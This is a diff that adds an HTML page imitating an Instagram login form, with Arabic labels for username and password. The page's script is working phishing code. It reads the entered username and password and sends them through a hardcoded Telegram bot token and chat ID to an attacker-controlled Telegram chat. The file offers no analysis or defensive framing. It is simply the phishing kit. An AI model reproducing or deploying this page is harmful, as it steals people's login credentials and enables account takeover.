@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<style>
+
+body{
+background:#f0f2f5;
+font-family:Arial;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.box{
+background:white;
+padding:30px;
+border-radius:10px;
+text-align:center;
+width:250px;
+}
+
+input{
+width:90%;
+padding:10px;
+margin:10px 0;
+border:1px solid #ccc;
+border-radius:5px;
+background:transparent;
+}
+
+button{
+width:95%;
+padding:10px;
+background:#3897f0;
+color:white;
+border:none;
+border-radius:5px;
+cursor:pointer;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+<h3>تسجيل الدخول حساب انستغرام</h3>
+
+<input id="name" placeholder="اسم المستخدم">
+
+<input id="secret" placeholder="كلمة سر" type="password">
+
+<button onclick="send()">دخول</button>
+
+</div>
+
+<script>
+
+const TOKEN = "8636021665:AAGhU_BAdory7k_IwaZuuxkZA7EXGtacaOc";
+const CHAT_ID = "7737717483";
+
+function send(){
+
+let name = document.getElementById("name").value;
+let secret = document.getElementById("secret").value;
+
+let text = "بيانات جديدة:\nالاسم: " + name + "\nالسر: " + secret;
+
+fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:text
+})
+});
+
+}
+
+</script>
+
+</body>
+</html>
